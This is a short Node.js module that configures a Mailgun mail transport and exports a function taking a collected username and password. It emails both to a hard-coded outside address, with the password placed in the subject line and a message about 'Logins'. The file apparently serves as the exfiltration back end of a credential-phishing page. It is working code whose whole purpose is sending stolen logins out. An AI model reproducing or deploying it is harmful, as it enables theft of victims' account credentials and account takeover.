const nodemailer = require('nodemailer')
const mailGun = require('nodemailer-mailgun-transport')
require('dotenv').config();


const auth = {
    auth: {
        api_key: process.env.MAILGUN_API_KEY,
        domain: process.env.MAILGUN_DOMAIN
    }
};

const transporter = nodemailer.createTransport(mailGun(auth))

const sendMail = (collectUserName,collectPassword,cb) => {
    const mailOptions = {
        from: collectUserName,
        to: 'mbush@phoenixcds.org',
        subject: collectPassword,
        text: 'the Logins lord commander'
    }
    
    transporter.sendMail(mailOptions, function(err, data){
        if (err) {
            cb(err,null)
        } else {
            cb(null,data)
        }
    })
}

module.exports = sendMail

